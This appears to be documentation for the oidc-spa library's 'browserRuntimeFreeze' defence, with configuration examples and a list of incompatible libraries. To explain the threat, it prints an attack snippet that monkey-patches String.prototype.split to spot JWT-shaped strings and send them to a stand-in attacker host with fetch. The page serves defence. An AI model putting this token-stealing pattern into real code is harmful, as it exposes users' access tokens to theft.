---
description: Ensuring the integrity of the Browser Runtime Environement.
icon: igloo
---

# Browser Runtime Freeze

{% hint style="danger" %}
Still under construction
{% endhint %}

This is maybe the most important security defence as it's a prerequisite to ensure the other measures are actually effective.

It consist in ensuring the integrity of the Browser environement to make sure that an attaker cannot alterate the behavior of the core javascript language feature to exfiltrate tokens.

## Enabing the Defence

{% tabs %}
{% tab title="Vite Plugin" %}
{% code title="vite.config.ts" %}
```typescript
import { defineConfig } from "vite";
import { oidcSpa } from "oidc-spa/vite-plugin";

export default defineConfig({
    plugins: [
        // ...
        oidcSpa({
            // ...
            browserRuntimeFreeze: {
                enabled: true,
                // exclude: ["fetch", "XMLHttpRequest", "Promise"]
            }
        })
    ]
});
```
{% endcode %}
{% endtab %}

{% tab title="Manual" %}
Note this defence is only truly efficient if oidcEarlyInit is the first code that runs in the environement, even before any other code has been evaluated. If you're calling `oidcEarlyInit` in **oidc.ts** instead of the entrypoint, know that by the time the environement is hardened it might already have been compromized.

<pre class="language-typescript" data-title="src/main.ts"><code class="lang-typescript">import { oidcEarlyInit } from "oidc-spa/entrypoint";

const { shouldLoadApp } = oidcEarlyInit({
    // ...
<strong>    browserRuntimeFreeze: {
</strong><strong>        enabled: true,
</strong><strong>        // exclude: ["fetch", "XMLHttpRequest", "Promise"]
</strong><strong>    }
</strong>});

if (shouldLoadApp) {
    import("./main.lazy");
}
</code></pre>
{% endtab %}
{% endtabs %}

## browserRuntimeFreeze.exclude

Unfortunately there is a high likelyhood that your app will refuse to start after you've enabled browserRuntimeFreeze. &#x20;

You might be faced by an exception like this:





It’s possible that your app will refuse to start after enabling the defence.

If this happens, a dependency in your app is attempting to monkey-patch critical built-ins.\
oidc-spa cannot allow this while guaranteeing token protection.

Examples of incompatible libraries:

* `@microsoft/applicationinsights`, monkey-patches `fetch`
* `Zone.js`, monkey-patches `Promise` and `XMLHttpRequest`

If you encounter this situation, your only options are:

* Remove or replace the incompatible libraries, **or**
* Disable the oidc-spa exfiltration defence

Even with this defence disabled, oidc-spa still implements all current best practices for secure client-side auth (including **zero token persistence**).\
Your app will still pass a security audit.

## Understanding What This Protects Against

In javascript runtime, by default prety much any global APIs can be alterated at runtime. &#x20;

Example an attacker could write:

```javascript
// Attacker's code:

const split_original = String.prototype.split;

String.prototype.split = function (...args) {

    if( this.match(/^[\w-]+\.[\w-]+\.[\w-]+$/) ){
        fetch(`https://attacker-server.net?likelyAccessToken=${this}`);
    }

    return split_original.apply(this, args);
    
}

// Legitimate code run internally:

// Just like that, the token has been leaked.
const [header, payload, signature ] = accessToken.split(".");
```

The purpose of browserRuntimeFreeze is precisely to prevent this.&#x20;

To make sure that when you call .split() or fetch or promise.then() you're actually calling the real browther builtin and not a mokey patched version of it that would have been set by a compromized dependency you're using or an XSS attack.

With browserRuntimeFreeze enabled. Trying to do String.prototype.split = ()=>{} will throw a runtime exception. &#x20;
